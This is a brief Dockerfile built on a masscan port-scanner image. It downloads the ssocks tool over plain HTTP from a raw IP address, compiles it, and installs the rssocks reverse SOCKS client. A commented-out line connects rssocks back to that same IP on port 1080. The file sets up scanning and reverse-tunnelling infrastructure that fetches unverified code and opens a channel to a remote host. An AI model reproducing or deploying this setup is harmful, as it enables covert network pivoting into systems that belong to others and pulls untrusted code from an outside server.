FROM dordoka/masscan
RUN wget http://119.90.17.2/ssocks-0.0.14.tar.gz
RUN tar -xzvf ssocks-0.0.14.tar.gz
RUN cd ssocks-0.0.14 && ./configure && make
#RUN ./ssocks-0.0.14/src/rssocks -s 119.90.17.2:1080 -vv
RUN mv ./ssocks-0.0.14/src/rssocks /bin/
